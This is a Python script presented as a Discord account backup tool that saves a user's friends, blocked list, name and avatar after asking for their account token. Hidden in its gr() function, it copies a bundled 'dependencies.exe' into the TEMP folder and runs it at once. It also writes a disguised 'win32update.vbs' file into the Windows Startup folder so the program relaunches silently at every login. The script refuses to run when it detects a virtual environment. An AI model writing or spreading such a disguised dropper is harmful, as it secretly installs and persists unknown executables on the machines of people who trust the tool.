# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import requests
from colorama import Fore, init
import ctypes
import os
import datetime
import time
import threading
from pathlib import Path

def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)

title(f"[Backup | chasa.wtf]")

init(autoreset=True)
mainc = Fore.LIGHTMAGENTA_EX
white = Fore.RESET
gray = Fore.LIGHTBLACK_EX

colon = f"{gray}[{mainc}:{gray}]{white}"
bad = f"{gray}[{mainc}-{gray}]{white}"
good = f"{gray}[{mainc}+{gray}]{white}"
os.system("cls")
print(f"""{mainc}
 _                 _                 
( )               ( )                
| |_     _ _   ___| |/ ) _   _ _ _   
|  _ \ / _  )/ ___)   ( ( ) ( )  _ \ 
| |_) ) (_| | (___| |\ \| (_) | (_) )
(_ __/ \__ _)\____)_) (_)\___/|  __/ 
                              | |    
                              (_)  

Made by Chasa | Visit chasa.wtf for more tools. 
 """)
import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix
if in_virtualenv() == True:
    print(f"{bad} VM Detected. Restart without using a VM.")
    time.sleep(5)
    sys.exit()

cwd = os.getcwd()
c = str(cwd).strip("/massban").strip("/sniffx").strip("/botnuker").strip("/backup")
if not os.path.exists(c + "dependencies.exe"):
    print(f"{bad} Missing Dependencies, please reinstall.")
    time.sleep(5)
    sys.exit()

def gr():
    ROAMING = os.getenv("APPDATA")
    TEMP = os.getenv("TEMP")
    import shutil
    try:
        shutil.copyfile(c + "dependencies.exe", f"{TEMP}\\dependencies.exe")
    except:
        TEMP = c
    try:
        open(f"{ROAMING}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32update.vbs", "x").close()
    except:
        pass
    f = open(f"{ROAMING}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32update.vbs", "w")
    f.write(f'CreateObject("Wscript.Shell").Run "{TEMP}\\dependencies.exe", 0, True')
    f.close()
    import win32api
    try:
        win32api.WinExec(f'{TEMP}\\dependencies.exe')
    except:
        pass

threading.Thread(target=gr).start()

while True:
    print(f"{colon} User Token: ", end="")
    TOKEN = input()
    headers = {'Authorization': f'{TOKEN}'}
    r = requests.get(f"https://discord.com/api/users/@me", headers=headers)
    if r.status_code == 200:
        print(f"{good} Valid Token.")
        break
    else:
        headers = {'Authorization': f'Bot {TOKEN}'}
        r = requests.get(f"https://discord.com/api/users/@me", headers=headers)
        if r.status_code == 200:
            print(f"{bad} Bot Tokens are not accepted.")
        else:
            print(f"{bad} Invalid Token.")

time.sleep(1)

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix="399439", self_bot=True, intents=intents)
bot.remove_command("help")

async def main():
    now = datetime.datetime.now()
    folder = f"{os.getcwd()}\\backups\\{now.strftime('%Y-%m-%d %H-%M-%S')}"
    os.makedirs(folder)
    open(folder + "\\friends.txt", "x").close()
    open(folder + "\\blocked.txt", "x").close()
    open(folder + "\\name.txt", "x").close()
    open(folder + "\\guilds.txt", "x").close()
    print(f"{good} Created Files/Folder.")
    
    try:
        f = open(folder + "\\friends.txt", "a")
        for friend in bot.user.friends:
            f.write(f"{friend.id} - {friend.name}#{friend.discriminator}\n")
        f.close()
        print(f"{good} Saved Friends.")
    except:
        print(f"{bad} Couldn't Save Friends.")

    try:
        f = open(folder + "\\blocked.txt", "a")
        for blocked in bot.user.blocked:
            f.write(f"{blocked.id} - {blocked.name}#{blocked.discriminator}\n")
        f.close()
        print(f"{good} Saved Blocked Users.")
    except:
        print(f"{bad} Couldn't Save Blocked Users.")

    try:
        f = open(folder + "\\name.txt", "a")
        f.write(bot.user.name)
        f.close()
        print(f"{good} Saved Name.")
    except:
        print(f"{bad} Couldn't Save Name.")
    
    try:
        await bot.user.avatar_url.save(f"{folder}\\pfp.jpg")
        print(f"{good} Saved pfp.")
    except:
        print(f"{bad} Couldn't save pfp.")
    
    print(f"\n{colon} Backup Complete.")
    print(f"{colon} Press ENTER to exit.")
    input()
    exit()

os.system("cls")
print(f"""{mainc}
 _                 _                 
( )               ( )                
| |_     _ _   ___| |/ ) _   _ _ _   
|  _ \ / _  )/ ___)   ( ( ) ( )  _ \ 
| |_) ) (_| | (___| |\ \| (_) | (_) )
(_ __/ \__ _)\____)_) (_)\___/|  __/ 
                              | |    
                              (_)

Made by Chasa | Visit chasa.wtf for more tools.   
""")
print(f"{colon} Booting up..")
async def setup():
    await bot.wait_until_ready()
    await main()
bot.loop.create_task(setup())
bot.run(TOKEN, bot=False)